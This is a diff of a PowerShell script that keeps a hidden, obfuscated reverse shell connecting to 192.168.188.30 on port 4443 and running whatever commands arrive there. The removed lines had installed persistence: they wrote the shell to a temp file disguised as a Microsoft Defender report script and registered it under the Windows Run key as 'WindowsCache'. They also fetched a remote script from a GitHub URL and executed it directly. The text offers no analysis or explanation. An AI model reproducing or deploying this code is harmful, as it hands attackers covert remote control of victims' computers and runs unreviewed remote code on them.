@@ -1,12 +1,2 @@
 Start-Process $PSHOME\powershell.exe -ArgumentList {$5a73d5e9a3c14a0e95f8794422b3984a = New-Object System.Net.Sockets.TCPClient('192.168.188.30',4443);$3e54d96c8e0d4d0d9416f7e63f51c5b4 = $5a73d5e9a3c14a0e95f8794422b3984a.GetStream();[byte[]]$abf7f8097d4642b7a8ae320079dbd27e = 0..65535|%{0};while(($i = $3e54d96c8e0d4d0d9416f7e63f51c5b4.Read($abf7f8097d4642b7a8ae320079dbd27e, 0, $abf7f8097d4642b7a8ae320079dbd27e.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($abf7f8097d4642b7a8ae320079dbd27e,0, $i);$23b7ef29a53a45e3b9f347bc337a5bbd = (ie''x $data 2>&1 | Out-String );$23b7ef29a53a45e3b9f347bc337a5bbd2 = $23b7ef29a53a45e3b9f347bc337a5bbd + 'PS ' + (pw''d).Path + '> ';$5a6e60a3d3ef45e880ef5b2be99a1c19 = ([text.encoding]::ASCII).GetBytes($23b7ef29a53a45e3b9f347bc337a5bbd2);$3e54d96c8e0d4d0d9416f7e63f51c5b4.Write($5a6e60a3d3ef45e880ef5b2be99a1c19,0,$5a6e60a3d3ef45e880ef5b2be99a1c19.Length);$3e54d96c8e0d4d0d9416f7e63f51c5b4.Flush()};$5a73d5e9a3c14a0e95f8794422b3984a.Close()} -WindowStyle Hidden
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptName = "WindowsCache"
-$scriptCode = @"
-Start-Process $PSHOME\powershell.exe -ArgumentList {$5a73d5e9a3c14a0e95f8794422b3984a = New-Object System.Net.Sockets.TCPClient('192.168.188.30',4443);$3e54d96c8e0d4d0d9416f7e63f51c5b4 = $5a73d5e9a3c14a0e95f8794422b3984a.GetStream();[byte[]]$abf7f8097d4642b7a8ae320079dbd27e = 0..65535|%{0};while(($i = $3e54d96c8e0d4d0d9416f7e63f51c5b4.Read($abf7f8097d4642b7a8ae320079dbd27e, 0, $abf7f8097d4642b7a8ae320079dbd27e.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($abf7f8097d4642b7a8ae320079dbd27e,0, $i);$23b7ef29a53a45e3b9f347bc337a5bbd = (ie''x $data 2>&1 | Out-String );$23b7ef29a53a45e3b9f347bc337a5bbd2 = $23b7ef29a53a45e3b9f347bc337a5bbd + 'PS ' + (pw''d).Path + '> ';$5a6e60a3d3ef45e880ef5b2be99a1c19 = ([text.encoding]::ASCII).GetBytes($23b7ef29a53a45e3b9f347bc337a5bbd2);$3e54d96c8e0d4d0d9416f7e63f51c5b4.Write($5a6e60a3d3ef45e880ef5b2be99a1c19,0,$5a6e60a3d3ef45e880ef5b2be99a1c19.Length);$3e54d96c8e0d4d0d9416f7e63f51c5b4.Flush()};$5a73d5e9a3c14a0e95f8794422b3984a.Close()} -WindowStyle Hidden
-"@
 
-$scriptPath = "$env:TEMP\MSFT_MpPerformanceReport.Format.ps1"
-$scriptCode | Set-Content -Path $scriptPath -Force
-
-Set-ItemProperty -Path $regPath -Name $scriptName -Value $scriptPath
-(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/tayic99373/leave/main/leave.ps1') | Invoke-Expression
